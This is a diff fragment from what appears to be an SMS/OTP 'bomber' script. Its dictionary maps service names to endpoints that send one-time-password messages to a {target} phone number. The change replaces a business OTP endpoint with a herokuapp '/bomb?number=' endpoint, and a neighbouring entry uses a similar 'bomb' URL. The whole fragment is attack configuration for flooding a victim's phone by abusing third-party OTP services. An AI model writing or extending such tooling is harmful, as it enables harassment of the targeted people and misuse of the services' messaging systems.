@@ -19,7 +19,7 @@ apidata = {
 
 "idn":("https://www.industrybuying.com/user/api/send-otp/",{"username="+str(target)+"&"},{},"POST","200"),
 
-"bikry":(f"https://app.bizrise.in/otp/generate?&identifier={target}&start=0&type=MOBILE&communication=true",{},"GET",""),
+"bikry":(f"https://ruba-x11.herokuapp.com/bomb?number={target}",{},"GET",""),
 
 "kingotp":(f"https://ruba-x12.herokuapp.com/bomb?number={target}",{},"GET","<"),
 
